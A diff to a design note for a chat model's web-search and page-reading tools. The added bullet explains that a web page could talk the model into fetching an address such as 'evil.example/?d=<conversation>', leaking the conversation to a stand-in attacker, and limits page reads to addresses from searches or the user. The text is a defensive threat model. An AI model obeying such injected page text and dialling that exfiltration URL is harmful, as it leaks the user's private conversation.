@@ -28,6 +28,10 @@ The chat model gets `web_search` and `read_page` when the person switches web se
   (the chat model's own server, the search engine's, anything on localhost). The check is on the address actually dialled, after DNS
   and on every redirect, not on the text of the URL.
 
+- **`read_page` opens only what was offered.** The local-address guard does not stop a fetch of `https://evil.example/?d=<conversation>`,
+  which a page could talk the model into. So an address must be one the answer's searches returned or the person wrote. The model's
+  search words can still carry text to DuckDuckGo or Wikipedia; that is the feature's price and is in the README.
+
 ## Alternatives not taken
 
 A hosted "search the web" API behind the model (not local); SearXNG public instances (unreliable, rate-limited, and each is a stranger
